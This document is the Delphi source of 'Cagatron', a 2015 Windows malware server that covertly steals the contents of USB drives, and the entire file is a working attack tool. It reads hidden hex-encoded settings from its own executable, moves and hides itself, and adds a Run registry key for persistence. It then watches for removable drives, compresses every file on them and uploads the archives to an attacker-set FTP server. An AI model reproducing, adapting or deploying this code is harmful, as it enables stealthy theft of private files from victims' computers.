// Project Cagatron 1.0
// (C) Doddy Hackman 2015
// Based on Ladron by Khronos

program cagatron_server;

{$APPTYPE GUI}
{$R *.res}

uses
  SysUtils, WinInet, Windows, sevenzip;

var
  directorio, directorio_final, carpeta, nombrereal, yalisto: string;
  hide_op: string;
  registro: HKEY;
  ftp_op, ftp_host, ftp_user, ftp_pass, ftp_path: string;
  online: string;

  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure comprimir(dirnow, guardar: string);
var
  zipnow: I7zOutArchive;
  busqueda: TSearchRec;
begin

  zipnow := CreateOutArchive(CLSID_CFormat7z);
  SetCompressionLevel(zipnow, 9);
  SevenZipSetCompressionMethod(zipnow, m7LZMA);

  if FindFirst(dirnow + '\*.*', faAnyFile + faDirectory + faReadOnly,
    busqueda) = 0 then
  begin
    repeat
      if (busqueda.Attr = faDirectory) then
      begin
        if not(busqueda.Name = '.') and not(busqueda.Name = '..') then
        begin
          zipnow.AddFiles(dirnow + '/' + busqueda.Name, busqueda.Name,
            '*.*', True);
        end;
      end
      else
      begin
        zipnow.AddFile(dirnow + '/' + busqueda.Name, busqueda.Name);
      end;
    until FindNext(busqueda) <> 0;
    System.SysUtils.FindClose(busqueda);
  end;

  zipnow.SaveToFile(guardar);

  if (hide_op = '1') then
  begin
    SetFileAttributes(pchar(guardar), FILE_ATTRIBUTE_HIDDEN);
  end;

end;

function usb_name(checked: Char): string;
// Based on http://delphitutorial.info/get-volume-name.html
var
  uno, dos: DWORD;
  resultnow: array [0 .. MAX_PATH] of Char;
begin
  try
    GetVolumeInformation(pchar(checked + ':/'), resultnow, sizeof(resultnow),
      nil, uno, dos, nil, 0);
    Result := StrPas(resultnow);
  except
    Result := checked;
  end;
end;

function check_drive(target: string): boolean;
var
  a, b, c: cardinal;
begin
  Result := GetVolumeInformation(pchar(target), nil, 0, @c, a, b, nil, 0);
end;

function check_file_ftp(host, username, password, archivo: pchar): integer;
var
  controluno: HINTERNET;
  controldos: HINTERNET;
  abriendo: HINTERNET;
  valor: integer;

begin

  controluno := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
  controldos := InternetConnect(controluno, host, INTERNET_DEFAULT_FTP_PORT,
    username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

  abriendo := ftpOpenfile(controldos, pchar(archivo), GENERIC_READ,
    FTP_TRANSFER_TYPE_BINARY, 0);
  valor := ftpGetFileSize(abriendo, nil);

  InternetCloseHandle(controldos);
  InternetCloseHandle(controluno);

  Result := valor;

end;

procedure upload_ftpfile(host, username, password, filetoupload,
  conestenombre: pchar);

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  controluno: HINTERNET;
  controldos: HINTERNET;

begin

  try

    begin
      controluno := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
      controldos := InternetConnect(controluno, host, INTERNET_DEFAULT_FTP_PORT,
        username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
      ftpPutFile(controldos, filetoupload, conestenombre,
        FTP_TRANSFER_TYPE_BINARY, 0);
      InternetCloseHandle(controldos);
      InternetCloseHandle(controluno);
    end
  except
    //
  end;
end;

procedure buscar_usb;
var
  unidad: Char;
  usb_target, usb_nombre: string;
begin
  while (1 = 1) do
  begin
    Sleep(5000);
    for unidad := 'C' to 'Z' do
    begin
      if (check_drive(pchar(unidad + ':\')) = True) and
        (GetDriveType(pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        usb_target := unidad + ':\';
        usb_nombre := usb_name(unidad) + '.zip';
        if not(FileExists(usb_nombre)) then
        begin
          // Writeln('[+] Saving ' + usb_target + ' : ' + usb_nombre + ' ...');
          comprimir(usb_target, usb_nombre);
          // Writeln('[+] Saved');
          if (ftp_op = '1') then
          begin
            // Writeln('[+] Checking file in FTP ...');
            if (check_file_ftp(pchar(ftp_host), pchar(ftp_user),
              pchar(ftp_pass), pchar('/' + ftp_path + '/' + usb_nombre)) = -1)
            then
            begin
              // Writeln('[+] Uploading ...');
              upload_ftpfile(pchar(ftp_host), pchar(ftp_user), pchar(ftp_pass),
                pchar(usb_nombre), pchar('/' + ftp_path + '/' + usb_nombre));
              // Writeln('[+] Done');
            end
            else
            begin
              // Writeln('[+] File exists');
            end;
          end;
        end;
      end;
    end;
  end;
end;

begin

  try

    ob := INVALID_HANDLE_VALUE;
    code := '';

    ob := CreateFile(pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ, nil,
      OPEN_EXISTING, 0, 0);
    if (ob <> INVALID_HANDLE_VALUE) then
    begin
      SetFilePointer(ob, -9999, nil, FILE_END);
      ReadFile(ob, code, 9999, nose, nil);
      CloseHandle(ob);
    end;

    todo := regex(code, '[63686175]', '[63686175]');
    todo := dhencode(todo, 'decode');

    directorio := pchar(regex(todo, '[directorios]', '[directorios]'));
    carpeta := pchar(regex(todo, '[carpeta]', '[carpeta]'));
    directorio_final := GetEnvironmentVariable(directorio) + '/' + carpeta;
    hide_op := pchar(regex(todo, '[ocultar]', '[ocultar]'));

    ftp_op := pchar(regex(todo, '[ftp_op]', '[ftp_op]'));
    ftp_host := pchar(regex(todo, '[ftp_host]', '[ftp_host]'));
    ftp_user := pchar(regex(todo, '[ftp_user]', '[ftp_user]'));
    ftp_pass := pchar(regex(todo, '[ftp_pass]', '[ftp_pass]'));
    ftp_path := pchar(regex(todo, '[ftp_path]', '[ftp_path]'));

    online := pchar(regex(todo, '[online]', '[online]'));

    if (online = '1') then
    begin
      nombrereal := ExtractFileName(paramstr(0));
      yalisto := directorio_final + '/' + nombrereal;

      if not(DirectoryExists(directorio_final)) then
      begin
        CreateDir(directorio_final);
      end;

      // CopyFile(pchar(paramstr(0)), pchar(yalisto), False);
      MoveFile(pchar(paramstr(0)), pchar(yalisto));
      if (hide_op = '1') then
      begin
        SetFileAttributes(pchar(yalisto), FILE_ATTRIBUTE_HIDDEN);
      end;
      if (FileExists('7z.dll')) then
      begin
        // CopyFile(pchar('7z.dll'),
        // pchar(directorio_final + '/' + '7z.dll'), False);
        MoveFile(pchar('7z.dll'), pchar(directorio_final + '/' + '7z.dll'));
        if (hide_op = '1') then
        begin
          SetFileAttributes(pchar(directorio_final + '/' + '7z.dll'),
            FILE_ATTRIBUTE_HIDDEN);
        end;
      end;

      ChDir(directorio_final);

      if (hide_op = '1') then
      begin
        SetFileAttributes(pchar(directorio_final), FILE_ATTRIBUTE_HIDDEN);
      end;

      try
        begin
          RegCreateKeyEx(HKEY_LOCAL_MACHINE,
            'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
          RegSetValueEx(registro, 'uberk', 0, REG_SZ, pchar(yalisto), 666);
          RegCloseKey(registro);
        end;
      except
        //
      end;

      // Writeln('[+] Searching USB ...');

      BeginThread(nil, 0, @buscar_usb, nil, 0, PDWORD(0)^);

      while (1 = 1) do
        Sleep(5000);
    end
    else
    begin
      // Writeln('[+] Offline');
    end;

  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;

end.

// The End ?
